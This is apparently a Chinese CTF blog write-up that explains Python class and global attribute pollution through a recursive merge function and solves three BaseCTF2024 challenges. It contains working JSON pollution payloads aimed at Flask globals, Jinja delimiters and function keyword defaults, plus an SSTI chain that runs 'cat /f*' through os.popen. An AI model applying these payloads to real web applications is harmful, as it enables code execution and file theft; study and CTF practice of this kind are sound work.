---
title: python原型链污染
date: 2026-02-13 11:27:15
tags:
index_img: https://gitee.com/bobrocket/img/raw/master/img/image-20260304222946794.png
categories: CTF
---

## 前置知识

### 危险函数

```python
def merge(src, dst):
    # Recursive merge function
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
```

我们可以通过对src的控制，来控制dst的值，来达到我们污染的目的。

### 魔术方法

#### 父子类继承

```python
class father:
    secret = "hello"
class son_a(father):
    pass
class son_b(father):
    pass
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
instance = son_b()
payload = {
    "__class__" : {
        "__base__" : {
            "secret" : "world"
        }
    }
}
print(son_a.secret)#hello
print(instance.secret)#hello
merge(payload, instance)#hello
print(son_a.secret)#world
print(instance.secret)#world
```

通过`__base__`属性查找到继承的父类，然后污染到的父类中的secret参数

#### 获取全局变量

```python
a = 1
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
def demo():
    pass
class A:
    def __init__(self):
        pass
class B:
    classa = 2

instance = A()
payload = {
    "__init__":{
        "__globals__":{
            "a":4,
            "B":{
                "classa":5
            }
        }
    }
}
print(B.a)#2
print(a)#1
merge(payload, instance)
print(B.a)#5
print(a)#4
```

利用`__init__`装饰器的`__globals__`属性获取全局变量

### 参考文献

[浅谈Python原型链污染及利用方式-先知社区](https://xz.aliyun.com/news/12518)

[Python原型链污染从基础到深入 - Rycarls little blog](https://rycarl.cn/index.php/2025/04/28/python原型链污染从基础到深入/)

## [BaseCTF2024]圣钥之战1.0

先进/read查看源码

```php
from flask import Flask,request
import json

app = Flask(__name__)

def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

class cls():
    def __init__(self):
        pass

instance = cls()

@app.route('/', methods=['GET', 'POST'])
def hello_world():
    return open('/static/index.html', encoding="utf-8").read()

@app.route('/read', methods=['GET', 'POST'])
def Read():
    file = open(__file__, encoding="utf-8").read()
    return f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag(乐)
{file}
"

@app.route('/pollute', methods=['GET', 'POST'])
def Pollution():
    if request.is_json:
        merge(json.loads(request.data),instance)
    else:
        return "J1ngHong说：钥匙圣洁无暇，无人可以污染！"
    return "J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"

if __name__ == '__main__':
    app.run(host='0.0.0.0',port=80)
```

我们发现/read加载了file，那就只需要在/pollute下污染全局变量`__file__`

![image-20260213145449741](https://gitee.com/bobrocket/img/raw/master/img/image-20260213145449741.png)

## [BaseCTF2024]Jinja Mark

打开发现两个路由/index和/flag

/index是ssti注入，但是过滤了花括号，提示了/magic

去/flag用bp爆破出lucky_number是5346，得到了部分源码

```python
BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

所以思路就是在/magic路由下污染jinja语法标识符

```json
{
    "__init__" : {
        "__globals__" : {
            "app" : {
                    "jinja_env" :{
"variable_start_string" : "<<","variable_end_string":">>"
}        
            }
        }
    }
}
```

接下来就是无过滤的ssti，随便找个链子把{}换成<>就行了

```
<<config.__class__.__init__.__globals__['os'].popen('cat /f*').read()>>
```

## [BaseCTF2024]Lucky Number

```python
from flask import Flask,request,render_template_string,render_template
from jinja2 import Template
import json
import heaven
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)

class cls():
    def __init__(self):
        pass

instance = cls()

BLACKLIST_IN_index = ['{','}']
def is_json(data):
    try:
        json.loads(data)
        return True
    except ValueError:
        return False

@app.route('/m4G1c',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            result = heaven.create()
            message = result["message"]
            return "这个魔术还行吧
" + message
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"


#heaven.py

def create(kon="Kon", pure="Pure", *, confirm=False):
    if confirm and "lucky_number" not in create.__kwdefaults__:
        return {"message": "嗯嗯，我已经知道你要创造东西了，但是你怎么不告诉我要创造什么？", "lucky_number": "nope"}
    if confirm and "lucky_number" in create.__kwdefaults__:
        return {"message": "这是你的lucky_number，请拿好，去/check下检查一下吧", "lucky_number": create.__kwdefaults__["lucky_number"]}

    return {"message": "你有什么想创造的吗？", "lucky_number": "nope"}
```

根据题目的提示，要污染heaven.py的create函数的`__kwdefaults__`属性，审计代码发现还有一关判断，就是confirm必须是true

### 方法一（可以通过全局变量访问heaven.py）

```json
{
    "__init__":{
        "__globals__":{
            "heaven":{
                "create":{
                    "__kwdefaults__":{
                        "confirm":"True",
                        "lucky_number":"5346"
                    }
                }
            }
        }
    }
}
```

接下来到/check发现和上个题套路一样，/ssSstTti1无过滤的ssti注入

![image-20260214173156585](https://gitee.com/bobrocket/img/raw/master/img/image-20260214173156585.png)**

### 方法二（通法）

贴一下官方wp

此处是要污染**heaven.py**的**create**函数的**__kwdefaults__**属性，该属性存储的是仅关键字参数，即位于*****之后的参数。由于**create**函数在另一个模块中，我们需要利用**sys**模块的**modules**属性来获取到**heaven.py**，但是代码中并没有导入**sys**模块。那么该怎么获取到这个模块呢？在python中存在着**__spec__**内置属性，包含了关于类加载时的信息，定义在Lib/importlib/_bootstrap.py的类ModuleSpec，所以可以直接采用`<模块名>.__spec__.__init__.__globals__['sys']`获取到sys模块，此处就可以使用json模块获取

```json
{
    "__init__": {
        "__globals__": {
            "json":{
                "__spec__":{
                    "__init__" : {
                        "__globals__" : {
                            "sys" : {
                                "modules" : {
                                    "heaven" : {
                                        "create" : {
                                              "__kwdefaults__" : {
                                              "confirm" : true,
                                              "lucky_number" : "5346"
                                             } 
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
```

### 非预期解——修改静态目录

```json
{
    "__init__":{
        "__globals__":{
            "app":{
                "_static_folder":"./"
            }
        }
    }
}
```

访问/static/flag

#### 参考

[Python原型链污染之修改静态目录_](https://yschen20.github.io/2025/11/17/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E4%B9%8B%E4%BF%AE%E6%94%B9%E9%9D%99%E6%80%81%E7%9B%AE%E5%BD%95/)